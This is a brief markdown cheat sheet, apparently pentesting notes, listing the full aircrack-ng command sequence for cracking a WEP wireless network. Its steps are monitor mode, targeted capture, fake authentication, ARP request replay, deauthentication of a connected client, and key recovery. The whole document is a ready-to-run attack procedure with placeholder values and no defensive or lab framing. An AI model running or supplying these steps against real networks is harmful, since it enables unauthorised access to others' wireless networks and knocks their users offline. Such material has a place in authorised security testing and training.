# wep attack summary ##

Place your wireless card into monitor mode on the channel number of the AP:
```
airmon-ng start <interface> <AP channel>
```

Start an Airodump-ng capture filtering on the AP channel and BSSID, saving the file to disk:
```
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
```

Conduct a fake authentication attack against the AP:
```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

Launch the ARP request replay attack:
```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```

Deauthenticate the connected client to force new IV generation by the AP:
```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:
```
aircrack-ng <capture>
```
